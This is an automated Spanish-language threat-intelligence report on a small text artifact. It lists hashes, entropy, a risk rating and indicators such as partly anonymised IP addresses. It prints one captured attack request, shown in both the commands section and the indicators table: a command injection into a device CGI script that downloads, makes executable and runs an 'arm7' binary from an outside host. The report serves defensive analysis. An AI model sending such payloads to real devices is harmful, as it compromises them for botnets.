# 🧬 Payload Analysis

`fe28d3ca5d710904586bac6e082159887090e1068d4e53a5981cdc905682f1c9`

## 📌 Resumen

Artefacto de 191 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.21. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Se identificó 1 comando observado o extraído. Se identificaron 4 indicadores técnicos.


## 🏷️ Clasificación

- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:07:53.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `fe28d3ca5d710904586bac6e082159887090e1068d4e53a5981cdc905682f1c9`
- **SHA1:** `18e98d4c430e244ca6732f444319e96653b4e257`
- **MD5:** `d04e012d01cbfc432dceb24cca015618`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 191 B |
| Entropía | 5.21 |
| Strings | 3 |

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /cgi-bin/shortcut_telnet.cgi?cd%20/tmp%3Brm%20arm7%3Bwget%20http%3A//31.56.209.XXX/arm7%3Bchmod%20777%20*%3B./arm7%2
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.177.XXX | static_analysis |
| ip | 31.56.209.XXX | static_analysis |
| command | GET /cgi-bin/shortcut_telnet.cgi?cd%20/tmp%3Brm%20arm7%3Bwget%20http%3A//31.56.209.XXX/arm7%3Bchmod%20777%20*%3B./arm7%2 | strings |
| hash | fe28d3ca5d710904586bac6e082159887090e1068d4e53a5981cdc905682f1c9 | static_analysis |
| ip | 45.198.224.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
